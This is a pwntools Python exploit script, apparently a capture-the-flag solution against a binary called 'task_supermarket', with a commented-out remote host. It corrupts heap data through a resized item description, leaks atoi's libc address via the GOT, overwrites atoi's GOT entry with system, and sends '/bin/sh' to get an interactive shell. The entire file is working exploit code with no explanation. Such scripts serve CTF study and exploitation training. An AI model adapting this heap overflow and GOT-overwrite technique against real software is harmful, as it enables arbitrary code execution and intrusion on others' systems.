from pwn import *

p = process("./task_supermarket")
#p = remote("117.78.43.123", 31420)
elf = ELF("./task_supermarket")
#libc = ELF("./libc.so.6")
libc = ELF("./libc.so")
context.log_level = 'debug'

def new(name, price, size, des):
    p.recvuntil("your choice>> ")
    p.sendline("1")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("price:")
    p.sendline(str(price))
    p.recvuntil("descrip_size:")
    p.sendline(str(size))
    p.recvuntil("description:")
    p.sendline(des)

def delete(name):
    p.recvuntil("your choice>> ")
    p.send("2\n")
    p.recvuntil("name:")
    p.sendline(name)

def list_all():
    p.recvuntil("your choice>> ")
    p.send("3\n")

def change_price(name, price):
    p.recvuntil("your choice>> ")
    p.sendline("4")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("or rise in:")
    p.sendline(str(price))

def change_des(name, size, des):
    p.recvuntil("your choice>> ")
    p.sendline("5")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("descrip_size:")
    p.sendline(str(size))
    p.recvuntil("description:")
    p.sendline(des)

free_got = elf.got['free']
atoi = elf.got['atoi']
puts = elf.plt['puts']

gdb.attach(p)
new("bill", 100, 0x80, "A"*0x80)
new("john", 200, 0x18, "A"*0x18)
change_des("bill", 0xb0, "")
new("merry", 200, 0x50, "A"*0x7)

payload = "merry\x00" + "A"*(0x1c-6-4-4) + p32(0x50) + p32(atoi) + p16(0x59)
change_des("bill", 0x80, payload)
list_all()
p.recvuntil("merry: price.")
p.recv(16)
real_atoi = u32(p.recv(4))
system = real_atoi - (libc.symbols['atoi'] - libc.symbols['system'])

log.info("real_atoi: %s" % hex(real_atoi))
log.info("system: %s" % hex(system))
change_des("merry", 0x50, p32(system))

p.recvuntil("your choice>> ")
p.sendline("/bin/sh\x00")
p.interactive()
